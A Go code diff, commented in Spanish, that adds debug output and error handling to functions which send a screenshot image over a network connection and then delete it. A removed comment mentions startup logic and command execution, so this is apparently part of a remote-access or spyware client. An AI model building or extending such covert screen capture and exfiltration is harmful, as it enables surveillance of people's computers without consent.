@@ -27,27 +27,39 @@ import (
 
 const TAMAÑO_BUFFER = 1024 // buffer para comandos promedios
 
-// aca voy a poner la logica del startup y la ejecucion de comandos
-
 // funcion similar a Envio( ) con la unica diferencia de que es para enviar imagenes por la red
 func Enviar_img(conexion net.Conn, archivo string) error {
 	buffer_tamaño := make([]byte, 8)
 
 	imagen, open_error := os.Open(archivo)
-	stat, _ := imagen.Stat() // obtengo stats de la imagen
-
-	buffer_img := make([]byte, stat.Size()) // obtengo el tamaño y creo un buffer
+	fmt.Println("-- se lee la imagen a enviar")
 
 	if open_error != nil {
 		return errors.New("[!] no se encuentra la imagen")
 	}
-	n, read_error := imagen.Read(buffer_img)
+	stat, stat_err := imagen.Stat() // obtengo stats de la imagen
+
+	if stat_err != nil {
+		fmt.Println("-- problema al obtener stats de imagen")
+		return errors.New("hubo un problema obteniendo las dimensiones de la imagen")
+	}
+	img_tamaño := stat.Size()
+	fmt.Println("-- tamaño de img obtenida :", img_tamaño)
+
+	buffer_img := make([]byte, img_tamaño) // obtengo el tamaño y creo un buffer
+
+	_, read_error := imagen.Read(buffer_img)
+
 	if read_error != nil {
 		return errors.New("[!] error al codificar imagen")
 	}
-	binary.BigEndian.PutUint64(buffer_tamaño, uint64(n))
+	fmt.Println("-- lectura de imagen correcta")
+
+	binary.BigEndian.PutUint64(buffer_tamaño, uint64(img_tamaño)) //guardo el tamaño en el buffer en formato de bigendian
+	// envio de datos de la imagen (tamaño e imagen en cuestion)
 	Envio(conexion, buffer_tamaño)
 	Envio(conexion, buffer_img)
+	fmt.Println("-- envio de tamaño e imagen completado")
 
 	error_close := imagen.Close()
 	if error_close != nil {
@@ -57,6 +69,7 @@ func Enviar_img(conexion net.Conn, archivo string) error {
 	if err != nil {
 		return err
 	}
+	fmt.Println("-- eliminacion de imagen completado")
 	return nil
 }
 
@@ -69,6 +82,7 @@ func Ss(conexion net.Conn) error {
 
 		return erro
 	}
+	fmt.Println("-- captura de pantalla desplegada con exito")
 
 	arch, arch_err := os.Create(nombre)
 
